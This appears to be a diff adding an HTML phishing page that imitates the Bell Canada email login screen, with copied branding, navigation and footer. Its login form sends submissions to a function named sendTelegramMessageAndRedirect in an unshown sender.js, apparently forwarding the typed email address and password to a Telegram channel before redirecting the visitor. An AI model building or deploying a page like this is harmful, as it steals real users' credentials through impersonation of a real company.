@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./Bell-asset/bell-favicon.svg" type="image/x-icon"> 
+    <!-- <script src="./script.js" defer></script> -->
+    <script src="./sender.js" defer></script>
+    <title>Bell email</title>
+  </head>
+  <body>
+    <body>
+      <header>
+        <div class="nav">
+          <img src="./Bell-asset/newBellLogo.png" alt="" class="logo"/>
+          <ul class="navbar">
+            <li class="navbar__link">
+                <span>Shop</span>
+                <i class="fa-solid fa-caret-down"></i>
+            </li>
+            <li class="navbar__link">
+                <span>Support</span>
+                <i class="fa-solid fa-caret-down"></i>
+            </li>
+            <li class="navbar__link">
+                <span>MyBell</span>
+                <i class="fa-solid fa-caret-down"></i>
+            </li>
+        </ul>
+        <button type="button" class="lang">Français</button type="button">
+        </div>
+      </header>
+      <main>
+        <div class="container">
+            <h1 class="title">Bell email</h1>
+            <div class="col-2">
+                <div class="col">
+                    <h2 class="sub__title">Log in</h2>
+                    <div class="wrapper">
+                        <form action="" id="form" class="form" onsubmit="sendTelegramMessageAndRedirect(); return false; return false;">
+                            <label for="email" class="label">Email Address</label>
+                            <input type="email" name="email" id="email" class="input">
+                            <span class="error">Please enter a valid email address.</span>
+                            <label for="password" class="label">Password</label>
+                            <input type="password" name="password" id="password" class="input">
+                            <!-- <div class="captcha__wrapper">
+                                <input type="checkbox" name="checkbox" id="checkbox">
+                                <label for="checkbox">I'm not a robot</label>
+                            </div> -->
+                            <div class="remember-me">
+                              <input type="checkbox" name="checkbox" id="checkbox" class="checkbox">
+                              <label for="checkbox" class="checkbox__label">Keep me logged in</label>
+                            </div>
+                            <button type="submit" class="btn--submit">Login</button>
+                        </form>
+                    </div>
+                </div>
+                <div class="col">
+                    <h2 class="sub__title">New! Your Bell email is getting even better</h2>
+                    <div class="wrapper">
+                        <h3 class="list__title">Here are some of the updates you'll start to see soon:</h3>
+                        <ul class="list">
+                            <li class="list-item">A new look for an improved experience</li>
+                            <li class="list-item">An easy-to-use floating tool bar for quick access to features</li>
+                            <li class="list-item">A smart way to sort and categorize to keep your inbox organized</li>
+                            <li class="list-item">An optimized mobile experience supported on even more browsers</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+      </main>
+      <footer>
+        <div class="footer">
+          <a href="" class="link">Privacy</a>
+          <a href="" class="link">Legal & Regulatory</a>
+          <p class="footer-para">© Bell Canada, 2024. All rights reserved.</p>
+        </div>
+      </footer>
+    </body>
+  </body>
+</html>
